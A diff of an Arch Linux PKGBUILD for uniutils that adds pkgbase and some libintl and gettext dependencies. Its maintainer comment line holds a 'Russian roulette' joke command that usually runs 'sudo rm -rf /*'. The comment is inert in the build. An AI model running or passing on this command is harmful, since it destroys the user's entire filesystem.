@@ -1,15 +1,17 @@
 # Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
 # Contributor: Rick W. Chen <stuffcorpse@archlinux.us>
 
-pkgname=uniutils
+pkgbase=uniutils
+pkgname=${pkgbase}
 pkgver=2.27
 pkgrel=2
 pkgdesc="A set of programs for manipulating and analyzing Unicode text"
 arch=('i686' 'x86_64')
 url="https://billposer.org/Software/unidesc.html"
 license=('GPL3')
-depends=()
-makedepends=('unicode-character-database')
+depends=('libintl')
+makedepends=('unicode-character-database'
+             'gettext-devel')
 optdepends=('ascii2binary')
 source=("https://billposer.org/Software/Downloads/$pkgname-$pkgver.tar.bz2"
         "uniname_typo.patch"
